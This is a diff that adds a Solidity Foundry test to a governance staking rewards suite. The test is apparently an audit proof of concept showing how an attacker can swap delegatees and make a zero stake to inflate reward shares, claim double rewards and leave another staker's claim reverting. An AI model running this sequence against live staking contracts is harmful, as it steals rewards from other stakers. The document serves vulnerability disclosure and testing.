@@ -2764,6 +2764,58 @@ contract NotifyRewardAmount is GovernanceStakerRewardsTest {
     assertLe(govStaker.scaledRewardRate(), _expectedRewardRate);
   }
 
+  function test_shareManipulationIfRewardsArentCeckpointed() public {
+    earningPowerCalculator.__setEarningPowerForDelegatee(address(0x1), 0);
+    earningPowerCalculator.__setEarningPowerForDelegatee(address(0x2), 500e18);
+
+    address _doe = makeAddr("doe");
+    _mintGovToken(_doe, 500e18);
+    _stake(_doe, 500e18, address(0x2));
+
+    address _fox = makeAddr("fox");
+
+    //!audit-ok Step 1, fox deposits with full earning power
+    _mintGovToken(_fox, 500e18);
+    _stake(_fox, 500e18, address(0x2));
+
+    //!audit-ok some rewards are sent
+    rewardToken.mint(rewardNotifier, 1_000_000e18);
+    // The contract is notified of a reward
+    vm.startPrank(rewardNotifier);
+    rewardToken.transfer(address(govStaker), 1_000_000e18);
+    govStaker.notifyRewardAmount(1_000_000e18);
+    vm.stopPrank();
+
+    //!audit-ok some time passes and fox becomes eligible
+    _jumpAhead(100);
+    _jumpAheadByPercentOfRewardDuration(101);
+
+    /*
+    * Begin manipulation
+    */
+
+    //!audit-ok fox alters delegatee
+    vm.prank(_fox);
+    govStaker.alterDelegatee(GovernanceStaker.DepositIdentifier.wrap(1), address(0x2));
+
+    //!audit-ok fox checkpoints global rewards
+    _mintGovToken(_fox, 0);
+    _stake(_fox, 0, address(0x1));
+
+    //!audit-ok fox alters back to valid delegatee
+    vm.prank(_fox);
+    govStaker.alterDelegatee(GovernanceStaker.DepositIdentifier.wrap(1), address(0x2));
+
+    //!audit-ok fox claims double the rewards
+    vm.prank(_fox);
+    govStaker.claimReward(GovernanceStaker.DepositIdentifier.wrap(1));
+
+    //!audit-ok doe claims double the rewards (the share inflation is valid for everybody)
+    vm.prank(_doe);
+    vm.expectRevert();
+    govStaker.claimReward(GovernanceStaker.DepositIdentifier.wrap(0));
+  }
+
   function testFuzz_EmitsAnEventWhenRewardsAreNotified(uint256 _amount) public {
     _amount = _boundToRealisticReward(_amount);
     rewardToken.mint(rewardNotifier, _amount);
